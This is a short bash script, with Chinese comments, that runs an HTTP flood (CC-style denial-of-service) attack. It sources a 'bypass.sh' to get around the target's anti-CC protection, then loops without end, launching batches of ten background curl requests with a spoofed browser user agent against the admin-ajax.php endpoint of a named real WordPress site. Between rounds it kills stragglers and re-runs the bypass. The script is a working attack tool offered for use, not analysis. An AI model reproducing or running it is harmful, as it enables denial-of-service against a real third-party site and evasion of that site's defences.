#!/bin/bash

echo "开始检测并尝试绕过anticc限制。"
source bypass.sh
return_code=$?
#echo $return_code

if [ $return_code = 0 ]
then
    # 执行命令
    echo "检测完毕，当前未被anitcc限制。继续操作。"

else
    echo "绕过anticc限制失败。"
    exit 1
fi


threadscount=10 #启动curl的线程数
waitingtime=20 #等待curl结束的最长时间(秒)
target="https://www.7mlx.com/wp-admin/admin-ajax.php?action=get_current_user&a=b&?action=search_box&action=views_record&id=3474&action=views_record&id=3895"
requesthead="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
while true
num=1 #初始化检测的循环
do
for i in $( seq 1 $threadscount)
do 
    nohup curl -A "$requesthead" "$target" >/dev/null 2>&1 &
done

echo -e "\e[42m 已启动$threadscount 个curl进程。现在开始检测并等待最后一个curl下载完成。 \e[0m"

while [ $num -le $waitingtime ]
do
num=$(( $num + 1 ))
ps -fe|grep curl |grep -v grep >nul
if [ $? -ne 0 ]
then
echo "curl已经全部退出。开始下一轮操作。"
num=$(($waitingtime+1))
else
echo "第$num 次检测curl状态。"
echo -e  "\e[41m curl仍在运行。 \e[0m等待1秒钟后重新检测(最长等待$waitingtime 秒)。"
sleep 1
fi

done

killall curl >nul 2>nul
echo -e "\e[42m curl已全部结束或已达最长等待时间。再次检测并尝试绕过anticc限制，并开始下一轮操作。 \e[0m"
sleep 2


echo "开始检测并尝试绕过anticc限制。"
source bypass.sh
return_code=$?
#echo $return_code

if [ $return_code = 0 ]
then
    # 执行命令
    echo "检测完毕，当前未被anitcc限制。继续操作。"

else
    echo "绕过anticc限制失败。"
    exit 1
fi
clear
done
